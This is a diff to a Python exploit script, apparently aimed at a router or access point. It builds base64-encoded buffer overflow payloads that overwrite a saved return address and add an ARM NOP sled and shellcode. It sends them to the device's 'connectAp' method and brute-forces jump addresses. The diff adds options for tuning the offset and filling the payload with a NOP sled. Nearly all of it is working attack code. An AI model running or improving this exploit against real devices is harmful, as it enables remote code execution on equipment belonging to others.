@@ -37,11 +37,23 @@ def build_shellcode():
 SLED = b"\x00\x00\xa0\xe1"   # mov r0,r0 (repeat to length at build time)
 
 
-def build(offset, marker=None, addr=None, sled=0, padpc=1, prefix=b""):
-    """marker/addr overwrite the saved lr at `offset`; sled is prepended to the shellcode."""
-    sc = build_shellcode()
+def build(offset, marker=None, addr=None, sled=0, padpc=1, prefix=b"", bare=False,
+          sledfill=False):
+    """marker/addr overwrite the saved lr at `offset`; sled is prepended to the shellcode.
+
+    `bare` stops after the overwritten word, so the payload length is exactly the
+    offset and nothing past the saved pc is disturbed — the only way to tell a
+    correct offset from a crash caused by the trailing shellcode.
+    """
+    sc = b"" if bare else build_shellcode()
     pre = prefix + b"\x00" if prefix else b""
-    filler = pre + bytes(random.getrandbits(8) for _ in range(max(0, offset - len(pre))))
+    if sledfill:
+        # every byte before the saved pc is a NOP, so a guessed jump target may
+        # land anywhere in the payload instead of only in the trailing sled
+        filler = (SLED * ((max(0, offset - len(pre)) + 3) // 4))[:max(0, offset - len(pre))]
+        filler = pre + filler
+    else:
+        filler = pre + bytes(random.getrandbits(8) for _ in range(max(0, offset - len(pre))))
     val = marker if marker is not None else addr
     pc = (val.to_bytes(4, "little") * max(1, padpc)) if val is not None else b""
     return base64.b64encode(filler + pc + SLED * (sled // 4) + sc).decode()
@@ -129,6 +141,8 @@ def main():
     ap.add_argument("--sled", type=int, default=0)
     ap.add_argument("--padpc", type=int, default=1)
     ap.add_argument("--prefix", default="")
+    ap.add_argument("--bare", action="store_true", help="stop at the overwritten word")
+    ap.add_argument("--sledfill", action="store_true", help="NOP-fill everything before the pc")
     ap.add_argument("--count", type=int, default=40)
     ap.add_argument("--step", type=lambda x: int(x, 0), default=0x200)
     a = ap.parse_args()
@@ -141,7 +155,7 @@ def main():
         for i in range(a.count if a.mode == "brute" else 1):
             candidate = base + i * a.step
             b64 = build(a.offset, addr=candidate, sled=a.sled, padpc=a.padpc,
-                        prefix=a.prefix.encode())
+                        prefix=a.prefix.encode(), sledfill=a.sledfill)
             params = connect_params(b64, a.ssid, a.bssid)
             t0 = time.time()
             r = req(a.host, sess, {"method": "connectAp", "params": params}, timeout=6)
@@ -157,7 +171,7 @@ def main():
                 sess = login(a.host, tries=40)
         return
 
-    b64 = build(a.offset, a.marker, a.addr, a.sled, a.padpc, a.prefix.encode())
+    b64 = build(a.offset, a.marker, a.addr, a.sled, a.padpc, a.prefix.encode(), a.bare)
     if a.mode == "build":
         if a.out:
             open(a.out, "w").write(b64)
